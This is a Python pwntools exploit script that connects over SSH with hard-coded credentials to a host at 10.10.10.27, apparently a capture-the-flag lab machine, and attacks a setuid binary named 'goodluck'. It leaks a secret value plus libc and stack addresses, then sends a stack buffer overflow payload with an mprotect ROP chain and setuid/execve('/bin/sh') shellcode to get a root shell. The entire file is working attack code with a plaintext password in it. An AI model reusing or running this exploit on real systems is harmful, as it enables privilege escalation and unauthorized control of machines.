#!/usr/bin/python3
from pwn import ssh, p32, asm

session = ssh(host="10.10.10.27", user="xalvas", password="18547936..*")
shell = session.process("/home/xalvas/app/goodluck")

payload  = b""
payload += b"A" * 8
payload += p32(0x80002ff8)

session.upload_data(payload, "/tmp/payload")

shell.sendlineafter(b": ", b"/tmp/payload")
shell.sendlineafter(b": ", b"2")

shell.recvuntil(b": ")
secret = int(shell.recvline().strip(), 16)

payload  = b""
payload += p32(secret)
payload += b"A" * 4
payload += p32(0x80002ff4)

session.upload_data(payload, "/tmp/payload")

shell.sendlineafter(b": ", b"4")
shell.sendlineafter(b": ", b"/tmp/payload")
shell.sendlineafter(b": ", b"3")

shell.recvuntil(b"is at ")
buffer_address = int(shell.recvline().strip(), 16)

libc_base = int(shell.recvline_contains(b"libc-2.23.so")[:8], 16)

stack_leak = shell.recvline_contains(b"[stack]")[:17].split(b"-")
stack_start = int(stack_leak[0], 16)
stack_end = int(stack_leak[1], 16)
stack_size = stack_end - stack_start

shellcode = asm("""
    push 0x17       # setuid()
    pop eax         # execve()

    xor ebx, ebx    # $ebx = 0

    int 0x80        # syscall

    mov al, 0xb     # $eax = execve()

    push 0x68       # $esp = &"h"
    pushw 0x732f    # $esp = &"/sh"
    push 0x6e69622f # $esp = &"/bin/sh"
    mov ebx, esp    # $ebx = &"/bin/sh"

    xor ecx, ecx    # $ecx = NULL
    cdq             # $edx = NULL

    int 0x80        # syscall
""")

offset = 76
junk = b"A" * (offset - len(shellcode))

payload  = b""
payload += shellcode
payload += junk
payload += p32(libc_base + 0xe2d50) # mprotect()
payload += p32(buffer_address)      # shellcode
payload += p32(stack_start)         # addr
payload += p32(stack_size)          # len
payload += p32(7)                   # prot

session.upload_data(payload, "/tmp/payload")
shell.sendlineafter(b": ", b"/tmp/payload")

shell.recvuntil(b" ")
shell.interactive()
